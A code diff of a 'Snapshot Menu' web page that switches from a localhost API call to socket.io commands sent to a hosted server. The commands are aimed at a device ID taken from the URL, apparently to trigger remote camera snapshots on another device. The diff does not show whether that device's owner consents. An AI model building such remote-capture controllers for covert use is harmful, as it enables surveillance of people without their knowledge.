@@ -6,7 +6,7 @@
     <title>Snapshot Menu</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* --- GLOBAL THEME (Consistent with Dashboard) --- */
+        /* --- GLOBAL THEME --- */
         :root {
             --bg-color: #0f0f0f;
             --glass-bg: rgba(255, 255, 255, 0.05);
@@ -24,7 +24,7 @@
             min-height: 100vh;
         }
 
-        /* --- HEADER (Back Button Style) --- */
+        /* --- HEADER --- */
         .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 30px; }
         .back-btn {
             background: var(--glass-bg); border: 1px solid var(--glass-border);
@@ -37,10 +37,10 @@
             color: var(--accent); text-transform: uppercase; letter-spacing: 1px; 
         }
 
-        /* --- CONTENT CONTAINER --- */
+        /* --- CONTAINER --- */
         .container { width: 100%; max-width: 400px; margin: 0 auto; }
 
-        /* --- LIST GROUPS --- */
+        /* --- LIST ITEMS --- */
         .list-group { margin-bottom: 25px; }
         .list-title { 
             color: #888; font-size: 0.8rem; margin-bottom: 10px; 
@@ -69,7 +69,7 @@
         .main-text { font-size: 1rem; color: #fff; font-weight: 500; }
         .sub-text { font-size: 0.75rem; color: #aaa; margin-top: 3px; }
         
-        /* Loading Animation inside button */
+        /* Spinner */
         .spinner {
             border: 2px solid rgba(255,255,255,0.1);
             border-top: 2px solid var(--accent);
@@ -79,7 +79,7 @@
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* --- BOTTOM ACTION --- */
+        /* --- BUTTON --- */
         .gallery-btn {
             width: 100%; padding: 15px; border-radius: 12px;
             background: linear-gradient(90deg, var(--accent), #00bcd4);
@@ -144,13 +144,24 @@
 
     </div>
 
+    <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
+
     <script>
-        // 🔥 IMPORTANT: Yahan apna server URL lagao (Localhost ya Cloud URL)
-        // Agar file directly khol rahe ho to: "http://localhost:3000"
-        // Agar server par host kar rahe ho to "/"
-        const API_BASE = "http://localhost:3000"; 
-        
-        // 1. SECURITY CHECK: ID Validation
+        // 🔥 UPDATE 1: Yahan humne tumhara RENDER URL daal diya hai
+        // Ab ye Localhost par nahi dhundega.
+        const SERVER_URL = "https://child-v9no.onrender.com"; 
+
+        // Socket connection initialize
+        const socket = io(SERVER_URL, {
+            transports: ['websocket'], // Force websocket for better speed
+            reconnection: true
+        });
+
+        socket.on('connect', () => {
+            console.log("✅ Connected to Server via Socket!");
+        });
+
+        // 1. DEVICE ID VALIDATION
         const urlParams = new URLSearchParams(window.location.search);
         let DEVICE_ID = urlParams.get('id');
 
@@ -163,7 +174,8 @@
             window.location.href = 'index.html'; 
         }
 
-        // 2. TRIGGER COMMAND FUNCTION
+        // 2. TRIGGER COMMAND FUNCTION (Via Socket)
+        // Ye function Laptop ka camera nahi kholega, bas server ko bolega
         function triggerCommand(element, command) {
             const spinner = element.querySelector('.spinner');
             const arrow = element.querySelector('.fa-chevron-right');
@@ -172,42 +184,27 @@
             spinner.style.display = "block";
             if(arrow) arrow.style.display = "none";
             element.style.opacity = "0.7";
-            element.style.pointerEvents = "none"; // Button disable during loading
+            element.style.pointerEvents = "none"; 
 
             console.log(`Sending command: ${command} to Device: ${DEVICE_ID}`);
 
-            // Send Command to Server
-            fetch(`${API_BASE}/api/send-command`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ device_id: DEVICE_ID, command: command })
-            })
-            .then(res => res.json())
-            .then(data => {
-                setTimeout(() => {
-                    // UI Reset (Loading Stop)
-                    spinner.style.display = "none";
-                    if(arrow) arrow.style.display = "block";
-                    element.style.opacity = "1";
-                    element.style.pointerEvents = "auto";
-                    
-                    if(data.status === "success") {
-                        // Success Feedback (Optional vibration)
-                        if(navigator.vibrate) navigator.vibrate(50);
-                    } else {
-                        alert("Error sending command!");
-                    }
-                }, 800);
-            })
-            .catch(err => {
-                console.error("Connection Error:", err);
-                alert("❌ Server Unreachable! Check if Node.js server is running.");
-                
+            // 🔥 FIX: Direct Socket Emit use kar rahe hain (API Fetch ki jagah)
+            // Ye zyada fast hai aur "Server Unreachable" kam karega
+            socket.emit('send-command', {
+                targetId: DEVICE_ID,
+                command: command
+            });
+
+            // Thoda delay taaki user ko feel ho ki request gayi hai
+            setTimeout(() => {
                 spinner.style.display = "none";
                 if(arrow) arrow.style.display = "block";
                 element.style.opacity = "1";
                 element.style.pointerEvents = "auto";
-            });
+                
+                // Optional: Toast message
+                // alert("Command Sent!"); 
+            }, 1000);
         }
 
         function goToGallery() {
